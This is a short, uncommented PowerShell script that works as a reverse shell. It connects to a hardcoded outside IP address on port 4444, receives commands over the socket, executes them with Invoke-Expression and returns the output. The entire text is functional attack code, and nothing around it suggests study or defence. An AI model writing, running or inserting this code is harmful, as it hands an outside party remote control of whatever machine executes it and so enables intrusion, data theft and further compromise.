$ip="159.223.17.233"
$port=4444
$client = New-Object System.Net.Sockets.TCPClient($ip,$port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object System.Byte[] 1024

while ($client.Connected) {
    if ($stream.DataAvailable) {
        $read = $stream.Read($buffer,0,$buffer.Length)
        $cmd = ([System.Text.Encoding]::UTF8).GetString($buffer,0,$read)
        try {
            $out = iex $cmd 2>&1 | Out-String
        } catch {
            $out = $_ | Out-String
        }
        $writer.Write($out + "`n")
    }
}
